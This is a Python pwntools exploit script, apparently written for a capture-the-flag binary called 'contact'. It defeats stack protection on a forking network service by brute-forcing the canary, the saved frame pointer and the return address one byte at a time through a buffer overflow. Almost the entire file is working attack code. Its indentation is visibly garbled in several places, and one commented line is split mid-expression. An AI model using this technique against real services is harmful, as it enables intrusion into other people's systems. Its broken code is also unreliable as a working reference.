from pwn import *

HOST = 'localhost'
PORT = 10000

context(os = "linux", arch = "amd64")
#context.log_level = 'DEBUG'

elf = ELF("./contact")

def screen_clean():
 sys.stdout.write("\033[F")
 sys.stdout.write("\033[K")
def canary_bruteforce(offset):

 junk = "A" * (offset)
 canary_value = ""

while len(canary_value) < 8:

 word = 0x00

while word < 0xff:

	try:
	 r = remote(HOST, PORT)
	 screen_clean()

	 payload = ""
	 payload += junk
	 payload += canary_value
	 payload += chr(word)

	 r.sendafter("Please enter the message you want to send to admin:", payload)
	 r.recvline()
	 if "Done" not in r.recvline():
	  raise EOFError
	 log.success("Byte found: " + hex(word))
	 canary_value += chr(word)
	 r.close()
	 screen_clean()
	 break

	except EOFError as error:
	 word += 1
	 r.close()
	 screen_clean()

 return u64(canary_value)

def rbp_bruteforce(offset, canary):

 junk = "A" * (offset)
 rbp_addr = ""

 while len(rbp_addr) < 8:

word = 0x00

while word < 0xff:

	try:
	r = remote(HOST, PORT)
	screen_clean()
	payload = ""
	payload += junk
	payload += p64(canary)
	payload += rbp_addr
	payload += chr(word)

	r.sendafter("Please enter the message you want to send to admin:", payload)
	r.recvline()
	result = r.recvline()
	if "Done" not in result:
	 raise EOFError
	log.success("Byte found: " + hex(word) + ". Response: " + result)
	rbp_addr += chr(word)
	r.close()
	screen_clean()
	break

	except EOFError as error:
	 word += 1
	 r.close()
	 screen_clean()

return u64(rbp_addr)

def return_address_bruteforce(offset, canary, rbp_addr):

 junk = "A" * (offset)
 ret_addr = "\x62" #had issues bruteforcing on remote
 
 while len(ret_addr) < 8:

  word = 0x00

  while word < 0xff:

	try:
	r = remote(HOST, PORT)
	screen_clean()
	payload = ""
	payload += junk
	payload += p64(canary)
	payload += p64(rbp_addr)
	payload += ret_addr
	payload += chr(word)

	r.sendafter("Please enter the message you want to send to admin:", payload)
	r.recvline(timeout=0.2)
	result = r.recvline(timeout=0.2)
	if "Done" not in result:
	 raise EOFError
	log.success("Byte found: " + hex(word) + ". Response: " + result)
	ret_addr += chr(word)
	r.close()
	screen_clean()
	break

  except EOFError as error:
   word += 1
   print word
   r.close()
   screen_clean()

  return u64(ret_addr)

log.info("Deploying stage 1: Canary bruteforce")

canary_offset = 0x38
canary_value = 0x148cc3a091864d00 #canary_bruteforce(canary_offset)
log.success("Canary value: " + hex(canary_value))

log.info("Deploying stage 2: RBP content bruteforce")

rbp_cont = 0x7ffcc93ab980 #rbp_bruteforce(canary_offset, canary_value)
log.success("RBP content: " + hex(rbp_cont))

#this part is for testing inaccurate bytes due to whatever garbage is on the stack
#p = remote(HOST, PORT)
#p.sendafter("Please enter the message you want to send to admin:", 'A' * 0x38 + p64(canary_value) + #p64
(0x7ffcc93ab980) + '\x62') #80 is least signifacant byte of rbp on remote
#print p.recvline()
#print p.recvline()
log.info("Deploying stage 3: Return address bruteforce")
ret_addr = return_address_bruteforce(canary_offset, canary_value, rbp_cont)
log.success("Return address: " + hex(ret_addr))
